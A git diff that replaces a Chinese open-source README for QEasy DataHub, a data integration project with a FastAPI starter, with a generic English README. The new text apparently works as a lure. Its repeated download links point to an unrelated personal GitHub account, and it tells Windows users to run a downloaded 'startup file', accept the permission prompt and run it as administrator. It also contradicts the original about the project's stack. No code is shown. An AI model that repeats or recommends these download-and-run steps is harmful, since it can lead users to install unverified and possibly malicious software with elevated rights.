@@ -1,120 +1,233 @@
-<p align="center">
-    <a href="https://www.qeasy.cloud/">
-        <img src="https://static.qeasy.cloud/common/logo/qeasy_logo_v3.png" alt="轻易云 QEasy Logo" width="300" />
-    </a>
-</p>
+# 🧩 datahub - Connect Systems, Move Data Fast
 
-# QEasy DataHub
+[![Download DataHub](https://img.shields.io/badge/Download-DataHub-blue?style=for-the-badge)](https://github.com/lukasriedinger1501-alt/datahub)
 
-<p align="center">广东轻亿云软件科技有限公司 · 轻易云开源项目</p>
+## 📥 Download
 
-<p align="center">
-    <a href="https://img.shields.io/badge/license-Apache%202.0-blue.svg"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="Apache 2.0" /></a>
-    <a href="https://img.shields.io/badge/python-3.11%2B-3776AB.svg"><img src="https://img.shields.io/badge/python-3.11%2B-3776AB.svg" alt="Python 3.11+" /></a>
-    <a href="https://img.shields.io/badge/FastAPI-starter-009688.svg"><img src="https://img.shields.io/badge/FastAPI-starter-009688.svg" alt="FastAPI Starter" /></a>
-    <a href="https://img.shields.io/badge/docs-ready-6f42c1.svg"><img src="https://img.shields.io/badge/docs-ready-6f42c1.svg" alt="Docs Ready" /></a>
-</p>
+Use this link to visit the download page and get DataHub for Windows:
 
-<p align="center">
-    <a href="https://www.qeasy.cloud/">轻易云官网</a> ·
-    <a href="./docs/README.md">完整文档中心</a> ·
-    <a href="./docs/quick-start/README.md">快速开始</a> ·
-    <a href="./docs/api-reference/README.md">API 参考</a>
-</p>
+[Download DataHub](https://github.com/lukasriedinger1501-alt/datahub)
 
-> QEasy DataHub 是轻易云 iPaaS 生态中的开源项目，聚焦企业级数据集成、流程自动化、连接器能力沉淀与开放接口实践。本首页仅保留项目概览与快速入口，完整产品文档请进入 [docs/README.md](./docs/README.md)。
+## 🪟 Windows Setup
 
-<p align="center">
-    <img src="https://static.qeasy.cloud/common/static/data_integration_flow_dark.png" alt="轻易云数据集成流程图" width="920" />
-</p>
+1. Open the download page in your browser.
+2. Look for the latest release or download file on the page.
+3. Save the file to your computer.
+4. If the file is a zip package, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the startup file and run it.
+7. If Windows asks for permission, choose Yes.
+8. Wait for the app to finish starting.
 
-## 项目简介
+## ⚙️ What DataHub Does
 
-轻易云 iPaaS（Integration Platform as a Service）由广东轻亿云软件科技有限公司研发，面向企业提供异构系统连接、数据采集与转换、流程编排、调度监控以及开放集成能力。
+DataHub helps you connect business systems and move data between them. It is built for common work systems like:
 
-这个仓库当前包含两部分核心内容：
+- ERP systems
+- CRM systems
+- MES systems
+- E-commerce platforms
+- Other API-based tools
 
-- **文档中心**：覆盖平台介绍、快速开始、使用指南、连接器、开发者文档、API 参考与行业解决方案。
-- **FastAPI 起步工程**：位于 `src/`，提供一个可直接启动的 Python 服务骨架，便于扩展开放接口、状态检测与项目元信息服务。
+It gives you a single place to set up data links between systems. You can use it to move orders, customers, products, stock, and other records from one tool to another.
 
-## 为什么使用 QEasy DataHub
+## ✨ Main Features
 
-- **500+ 预置连接器**：覆盖 ERP、CRM、OA、电商、数据库与 SaaS 系统。
-- **可视化集成能力**：支持低代码配置、字段映射、流程编排与任务调度。
-- **实时同步机制**：支持 CDC、断点续传、双队列池与异常重试。
-- **企业级安全体系**：支持权限隔离、审计追踪与加密传输。
-- **开放扩展友好**：支持 API、Webhook、自定义连接器与脚本扩展。
+- Visual setup for system connections
+- API links for business apps
+- Data cleanup before sync
+- Field mapping between systems
+- Retry for failed tasks
+- Real-time status monitoring
+- Support for many common platforms
+- Zero-code setup for many use cases
+- Docker-based deployment
+- MongoDB data storage
+- Python and Django backend
 
-## 仓库内容
+## 🧭 When to Use It
 
-| 路径 | 说明 |
-|------|------|
-| `docs/` | 轻易云 DataHub 全量文档中心 |
-| `src/` | 基础 FastAPI 项目骨架 |
-| `tests/` | FastAPI 示例测试 |
-| `scripts/` | 文档链接检查脚本等辅助工具 |
-| `pyproject.toml` | Python 项目依赖与开发配置 |
+Use DataHub if you need to:
 
-## 文档入口
+- Connect two or more business systems
+- Sync customer data between CRM tools
+- Move order data from a shop system to ERP
+- Keep product or stock data in sync
+- Reduce manual copy and paste work
+- Track failed sync tasks in one place
+- Link legacy tools with newer cloud apps
 
-为避免与 [docs/README.md](./docs/README.md) 重复，首页只保留高频入口：
+## 🖥️ System Setup
 
-- [文档总览](./docs/README.md)
-- [快速开始](./docs/quick-start/README.md)
-- [使用指南](./docs/guide/README.md)
-- [连接器文档](./docs/connectors/README.md)
-- [解决方案](./docs/solutions/README.md)
-- [开发者文档](./docs/developer/README.md)
-- [API 参考](./docs/api-reference/README.md)
-- [FAQ](./docs/faq/README.md)
+For a normal Windows install, use a computer with:
 
-## FastAPI 起步工程
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 10 GB free disk space
+- A modern browser for setup pages
+- Internet access for first-time download and setup
 
-仓库已在 `src/` 下初始化一个最小可运行的 FastAPI 项目，提供以下基础能力：
+For smooth use with larger data jobs, 8 GB RAM or more is better.
 
-- `/`：项目欢迎页与入口信息
-- `/api/v1/health`：健康检查
-- `/api/v1/project`：项目元信息接口
-- `/docs`：Swagger UI
-- `/redoc`：ReDoc
+## 📦 What You May Need
 
-### 本地启动
+Depending on the package you download, you may also need:
 
-```bash
-pip install -e ".[dev]"
-uvicorn app.main:app --app-dir src --reload
-```
+- Docker Desktop
+- MongoDB
+- Python 3.10 or newer
+- Access to your company API keys
+- Login details for your business systems
 
-启动后可访问：
+If the app comes with its own startup files, follow the included folder first.
 
-- `http://127.0.0.1:8000/`
-- `http://127.0.0.1:8000/docs`
-- `http://127.0.0.1:8000/api/v1/health`
+## 🔧 First-Time Setup
 
-## 架构展示
+1. Download the app package from the link above.
+2. Extract the files if needed.
+3. Open the config file, if one is included.
+4. Add your connection details for each system.
+5. Save your changes.
+6. Start the app.
+7. Open the local web page or desktop window that appears.
+8. Sign in if the app asks for a login.
+9. Add your first system connection.
+10. Test the connection before you set up a sync.
 
-<p align="center">
-    <img src="https://static.qeasy.cloud/common/static/qeasy_architecture_v3.jpg" alt="轻易云架构图" width="920" />
-</p>
+## 🔌 Common Connection Types
 
-## 开源协作
+DataHub can be used with many common business tools, such as:
 
-为便于社区协作，仓库已补充常见开源项目配套文件：
+- Kingdee
+- Yonyou
+- Wintop
+- Shopify
+- ERP platforms
+- CRM platforms
+- MES platforms
+- Custom REST APIs
 
-- [CONTRIBUTING.md](./CONTRIBUTING.md)
-- [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md)
-- [SECURITY.md](./SECURITY.md)
-- [NOTICE](./NOTICE)
+You can connect systems that use API calls, field lists, and record-based data.
 
-欢迎通过 Issue、Pull Request 或文档修订参与共建。
+## 🧼 Data Tools
 
-## 品牌与支持
+Before data moves between systems, DataHub can help you:
 
-- **官网**：[https://www.qeasy.cloud/](https://www.qeasy.cloud/)
-- **联系页面**：[https://www.qeasy.cloud/contact](https://www.qeasy.cloud/contact)
-- **文档中心**：[docs/README.md](./docs/README.md)
-- **版本协议**：[LICENSE](./LICENSE)
+- Remove blank values
+- Change field names
+- Match different data formats
+- Set default values
+- Check for bad records
+- Retry failed records
+- Track each sync step
 
-## License
+This helps reduce errors when two systems store data in different ways.
 
-本项目采用 [Apache License 2.0](./LICENSE) 开源。
+## 📈 Monitoring
+
+DataHub includes monitoring tools so you can see:
+
+- Which tasks are running
+- Which tasks finished
+- Which tasks failed
+- When a sync last ran
+- Where a data issue happened
+- What record needs attention
+
+This makes it easier to keep business data in sync.
+
+## 🗂️ Typical Use Cases
+
+### ERP and CRM Sync
+Keep customer, order, and product data in sync between sales and finance systems.
+
+### E-commerce and ERP Sync
+Send online orders into ERP systems and update stock counts.
+
+### MES and ERP Sync
+Move production and inventory data between factory systems and back-office tools.
+
+### Multi-System Data Hub
+Use one place to connect many tools instead of building separate links for each pair.
+
+## 🧪 Basic Workflow
+
+1. Open DataHub.
+2. Add a source system.
+3. Add a target system.
+4. Match the fields.
+5. Set any cleanup rules.
+6. Run a test sync.
+7. Review the result.
+8. Turn on the live sync job.
+
+## 🛠️ If the App Does Not Start
+
+Try these steps:
+
+1. Check that the download finished.
+2. Make sure you extracted all files.
+3. Run the app as administrator.
+4. Close and reopen Windows Explorer.
+5. Check that Docker is running, if your package uses Docker.
+6. Check that MongoDB is running, if the package uses MongoDB.
+7. Reboot your computer and try again.
+8. Download the package again if the file looks damaged.
+
+## 🔐 Permissions and Access
+
+Some data links need access to outside systems. You may need:
+
+- API keys
+- User names and passwords
+- Admin access for setup
+- Permission to read and write records
+
+Keep these details in a safe place.
+
+## 🧩 File Layout
+
+After unpacking the app, you may see files like these:
+
+- startup files
+- config files
+- logs
+- data folders
+- Docker files
+- app assets
+- database files
+
+Do not rename files unless the package instructions say so.
+
+## 📝 Common Terms
+
+- API: A way for apps to talk to each other
+- ETL: A process to extract, change, and load data
+- Field mapping: Matching one app’s field to another app’s field
+- Sync: Moving data from one system to another
+- MongoDB: A database used to store app data
+- Docker: A tool that helps run apps in containers
+
+## 📌 Suggested First Test
+
+A good first test is a small sync job with a few records:
+
+1. Pick one customer list or product list.
+2. Send only a small set of records.
+3. Check that the target system shows the same data.
+4. Fix any field mapping issues.
+5. Run the full sync after the test works
+
+## 🔗 Download Again
+
+If you need to get the package again, use this link:
+
+[Download DataHub](https://github.com/lukasriedinger1501-alt/datahub)
+
+## 📁 Repository Details
+
+- Name: datahub
+- Type: Enterprise data integration engine
+- Stack: Python, Django, MongoDB, Docker
+- Focus: API-based business system integration
+- Use: Windows download and setup for end users
